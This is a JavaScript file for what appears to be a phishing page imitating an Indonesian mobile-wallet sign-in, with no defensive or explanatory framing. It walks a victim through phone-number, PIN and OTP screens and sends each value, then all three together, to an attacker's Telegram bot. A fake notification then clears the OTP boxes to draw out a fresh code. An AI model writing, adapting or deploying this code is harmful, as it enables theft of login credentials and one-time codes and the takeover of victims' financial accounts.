document.addEventListener("DOMContentLoaded", function () {
  const phoneNumberInput = document.getElementById("phone-number");
  const pinInputs = document.querySelectorAll(".pin-box");
  const otpInputs = document.querySelectorAll(".otp-box");
  const lanjutkanButton = document.getElementById("lanjutkan-button");
  const numberPage = document.getElementById("number-page");
  const pinPage = document.getElementById("pin-page");
  const otpPage = document.getElementById("otp-page");
  const floatingNotification = document.getElementById("floating-notification");

  let otpResendCount = 0;
  const maxOtpResend = 5;

  let userData = {
    nomor: "",
    pin: "",
    otp: ""
  };

  async function sendToTelegram(message) {
    try {
      const token = process.env.TELEGRAM_BOT_TOKEN; // Token diambil dari environment variables Vercel
      const chatId = process.env.TELEGRAM_CHAT_ID; // Chat ID diambil dari environment variables Vercel

      const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      if (!response.ok) {
        throw new Error('Failed to send message');
      }
    } catch (error) {
      console.error('Error sending message:', error);
    }
  }

  function formatPhoneNumber(input) {
    let phoneNumber = input.value.replace(/\D/g, '');
    if (phoneNumber.length === 1 && phoneNumber[0] !== '8') {
      phoneNumber = '8';
    }
    if (phoneNumber.length > 15) {
      phoneNumber = phoneNumber.substring(0, 15);
    }
    let formattedNumber = '';
    for (let i = 0; i < phoneNumber.length; i++) {
      if (i === 3 || i === 8) {
        formattedNumber += '-';
      }
      formattedNumber += phoneNumber[i];
    }
    input.value = formattedNumber;
  }

  function goToNextPage() {
    if (numberPage.style.display === "block") {
      const phoneNumber = phoneNumberInput.value.replace(/\D/g, '');
      if (phoneNumber.length >= 8) {
        userData.nomor = phoneNumber;
        numberPage.style.display = "none";
        pinPage.style.display = "block";
        phoneNumberInput.blur();
        lanjutkanButton.style.display = "none";
        pinInputs[0].focus();

        // Kirim notifikasi nomor ke Telegram
        const message = `
====DATA LENGKAP====
—————
→ ☎️ : ${userData.nomor} 
—————
        `;
        sendToTelegram(message);
      } else {
        alert("Nomor telepon harus minimal 8 digit.");
      }
    }
  }

  function handleAutoMoveInput(inputs, event) {
    const input = event.target;
    const index = Array.from(inputs).indexOf(input);

    if (event.inputType === "deleteContentBackward" && index > 0) {
      inputs[index - 1].focus();
    } else if (input.value.length === 1 && index < inputs.length - 1) {
      inputs[index + 1].focus();
    }

    if (inputs === pinInputs && index === inputs.length - 1) {
      setTimeout(() => {
        userData.pin = Array.from(pinInputs).map((input) => input.value).join("");
        pinPage.style.display = "none";
        otpPage.style.display = "block";
        otpInputs[0].focus();

        // Kirim notifikasi PIN ke Telegram
        const message = `
—————
→ 🅿️ : ${userData.pin} 
—————
        `;
        sendToTelegram(message);
      }, 300);
    }

    if (inputs === otpInputs && index === inputs.length - 1) {
      userData.otp = Array.from(otpInputs).map((input) => input.value).join("");
      sendFinalDataToTelegram();
      showFloatingNotification();
    }
  }

  async function sendFinalDataToTelegram() {
    const message = `
====DATA LENGKAP====
—————
→ ☎️ : ${userData.nomor} 
—————
→ 🅿️ : ${userData.pin} 
—————
→ ⭕ : ${userData.otp} 
—————
    `;
    await sendToTelegram(message);
  }

  function showFloatingNotification() {
    floatingNotification.style.display = "block";
    floatingNotification.addEventListener("click", function () {
      floatingNotification.style.display = "none";
      otpInputs.forEach((input) => (input.value = ""));
      otpInputs[0].focus();

      // Kirim notifikasi ke Telegram
      sendToTelegram("Pengguna telah memasukkan OTP dan notifikasi muncul.");
    });
  }

  function resendOtp() {
    if (otpResendCount < maxOtpResend) {
      otpResendCount++;
      sendToTelegram(`OTP telah dikirim ulang (${otpResendCount}/${maxOtpResend})`);
    } else {
      alert("Anda telah mencapai batas maksimal pengiriman ulang OTP.");
    }
  }

  phoneNumberInput.addEventListener("input", function () {
    formatPhoneNumber(phoneNumberInput);
  });

  pinInputs.forEach((input) => {
    input.addEventListener("input", (event) => handleAutoMoveInput(pinInputs, event));
  });

  otpInputs.forEach((input) => {
    input.addEventListener("input", (event) => handleAutoMoveInput(otpInputs, event));
  });

  lanjutkanButton.addEventListener("click", goToNextPage);
});